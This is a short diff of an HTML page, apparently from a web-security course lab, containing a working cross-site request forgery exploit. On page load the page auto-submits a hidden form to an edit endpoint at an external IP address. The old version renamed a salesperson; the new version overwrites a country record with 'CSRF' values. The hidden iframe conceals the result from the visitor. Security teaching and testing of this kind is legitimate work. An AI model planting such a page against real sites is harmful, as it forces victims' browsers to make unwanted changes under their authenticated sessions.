@@ -5,9 +5,10 @@
     <title>Welcome to Web Security</title>
   </head>
   <body onload="document.edit_salesperson.submit()">
-      <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=11" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
-      <input type="text" name="first_name" value="lazy, lazy, lazy.." />
-      <input type="text" name="last_name" value="one more lazy, FIRED" />
+      <form action="https://104.198.208.81/red/public/staff/countries/edit.php?id=3" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
+      <input type="hidden" name="name" value="aarapi CSRF"><br> 
+        <input type="hidden" name="code" value="CSRF"><br> <br> 
+        <input type="submit" name="submit" value="Click Me!">
     </form>
     <iframe name="hidden_results" style="display: none;"></iframe>
   </body>
